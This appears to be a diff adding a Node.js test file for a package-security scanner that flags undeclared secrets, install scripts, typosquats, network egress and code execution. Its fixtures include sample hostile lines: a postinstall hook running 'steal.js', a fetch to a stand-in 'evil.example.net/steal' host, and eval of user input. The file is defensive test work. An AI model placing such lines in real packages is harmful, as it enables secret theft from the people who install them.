@@ -1,0 +1,143 @@
+import test from 'node:test';
+import assert from 'node:assert/strict';
+import { gzipSync } from 'node:zlib';
+import { readTarGz } from '../src/tar.js';
+import {
+  checkUndeclaredSecrets,
+  checkInstallScripts,
+  checkProvenance,
+  checkTyposquat,
+  checkNetworkEgress,
+  checkCapabilities,
+  editDistance,
+} from '../src/checks.js';
+
+/** Build a single-file tar (ustar) in memory, so the reader is tested on real bytes. */
+function tarWith(path, content) {
+  const data = Buffer.from(content, 'utf8');
+  const header = Buffer.alloc(512);
+  header.write(path, 0, 100, 'utf8');
+  header.write('0000644\0', 100, 8, 'ascii'); // mode
+  header.write('0000000\0', 108, 8, 'ascii'); // uid
+  header.write('0000000\0', 116, 8, 'ascii'); // gid
+  header.write(`${data.length.toString(8).padStart(11, '0')}\0`, 124, 12, 'ascii');
+  header.write('00000000000\0', 136, 12, 'ascii'); // mtime
+  header.write('        ', 148, 8, 'ascii'); // checksum placeholder
+  header.write('0', 156, 1, 'ascii'); // typeflag: regular file
+  header.write('ustar\0', 257, 6, 'ascii');
+  header.write('00', 263, 2, 'ascii');
+  let sum = 0;
+  for (const b of header) sum += b;
+  header.write(`${sum.toString(8).padStart(6, '0')}\0 `, 148, 8, 'ascii');
+
+  const padded = Buffer.alloc(Math.ceil(data.length / 512) * 512);
+  data.copy(padded);
+  return Buffer.concat([header, padded, Buffer.alloc(1024)]);
+}
+
+function pkgWith(files, manifest = {}) {
+  return {
+    name: manifest.name ?? 'test-pkg',
+    version: '1.0.0',
+    manifest,
+    files: new Map(Object.entries(files).map(([k, v]) => [k, Buffer.from(v, 'utf8')])),
+    integrityOk: true,
+    versionCount: 5,
+    publishedAt: '2020-01-01T00:00:00.000Z',
+  };
+}
+
+test('tar reader round-trips a file and strips the package/ prefix', () => {
+  const files = readTarGz(gzipSync(tarWith('package/index.js', 'export const x = 1;\n')));
+  assert.equal(files.size, 1);
+  assert.equal(files.get('index.js').toString(), 'export const x = 1;\n');
+});
+
+test('tar reader skips files over the size cap', () => {
+  const files = readTarGz(gzipSync(tarWith('package/big.js', 'x'.repeat(5000))), { maxFileBytes: 100 });
+  assert.equal(files.size, 0);
+});
+
+test('flags a credential the registry entry never declared', () => {
+  const pkg = pkgWith({ 'index.js': 'const k = process.env.ACME_API_KEY;\n' });
+  const findings = checkUndeclaredSecrets(pkg, { server: { name: 'x' } }, new Map());
+  assert.equal(findings.length, 1);
+  assert.equal(findings[0].severity, 'high');
+  assert.match(findings[0].message, /ACME_API_KEY/);
+  assert.equal(findings[0].evidence[0].line, 1);
+});
+
+test('stays quiet when the entry declares the variable', () => {
+  const pkg = pkgWith({ 'index.js': 'const k = process.env.ACME_API_KEY;\n' });
+  const declared = new Map([['ACME_API_KEY', { isSecret: true, isRequired: true }]]);
+  assert.deepEqual(checkUndeclaredSecrets(pkg, { server: { name: 'x' } }, declared), []);
+});
+
+test('ignores ambient environment variables', () => {
+  const pkg = pkgWith({ 'index.js': 'if (process.env.NODE_ENV === "production") {}\n' });
+  assert.deepEqual(checkUndeclaredSecrets(pkg, null, new Map()), []);
+});
+
+test('reads python environment access too', () => {
+  const pkg = pkgWith({ 'main.py': 'token = os.environ.get("GITHUB_TOKEN")\n' });
+  const findings = checkUndeclaredSecrets(pkg, { server: { name: 'x' } }, new Map());
+  assert.equal(findings.length, 1);
+  assert.equal(findings[0].severity, 'high');
+});
+
+test('install scripts: postinstall is high, prepare is low', () => {
+  const findings = checkInstallScripts(
+    pkgWith({}, { scripts: { postinstall: 'node steal.js', prepare: 'npm run build' } })
+  );
+  assert.equal(findings.find((f) => f.message.includes('postinstall')).severity, 'high');
+  assert.equal(findings.find((f) => f.message.includes('prepare')).severity, 'low');
+});
+
+test('provenance: missing repository and a broken integrity hash', () => {
+  const pkg = pkgWith({}, {});
+  pkg.integrityOk = false;
+  const findings = checkProvenance(pkg);
+  assert.ok(findings.some((f) => f.severity === 'medium' && /repository/.test(f.message)));
+  assert.ok(findings.some((f) => f.severity === 'high' && /integrity/.test(f.message)));
+});
+
+test('typosquat: unscoped clone of an official name is high', () => {
+  const findings = checkTyposquat(pkgWith({}, { name: 'server-filesystem' }), [
+    '@modelcontextprotocol/server-filesystem',
+  ]);
+  assert.equal(findings[0].severity, 'high');
+});
+
+test('typosquat: one character off is medium, the official package itself is clean', () => {
+  const near = checkTyposquat(pkgWith({}, { name: 'server-filesystm' }), [
+    '@modelcontextprotocol/server-filesystem',
+  ]);
+  assert.equal(near[0].severity, 'medium');
+  const official = checkTyposquat(
+    pkgWith({}, { name: '@modelcontextprotocol/server-filesystem' }),
+    ['@modelcontextprotocol/server-filesystem']
+  );
+  assert.deepEqual(official, []);
+});
+
+test('egress ignores benign and declared hosts, reports the rest', () => {
+  const pkg = pkgWith({
+    'index.js': 'fetch("https://github.com/x"); fetch("https://api.declared.io/v1"); fetch("https://evil.example.net/steal");',
+  });
+  const entry = { server: { remotes: [{ url: 'https://api.declared.io/mcp' }] } };
+  const hosts = checkNetworkEgress(pkg, entry).map((f) => f.message);
+  assert.deepEqual(hosts, ['contacts evil.example.net']);
+});
+
+test('capabilities surface execution and evaluation', () => {
+  const pkg = pkgWith({ 'index.js': 'import { execSync } from "child_process";\neval(userInput);\n' });
+  const labels = checkCapabilities(pkg).map((f) => f.message);
+  assert.ok(labels.some((l) => /process execution/.test(l)));
+  assert.ok(labels.some((l) => /dynamic code evaluation/.test(l)));
+});
+
+test('edit distance', () => {
+  assert.equal(editDistance('abc', 'abc'), 0);
+  assert.equal(editDistance('abc', 'abd'), 1);
+  assert.equal(editDistance('', 'abc'), 3);
+});
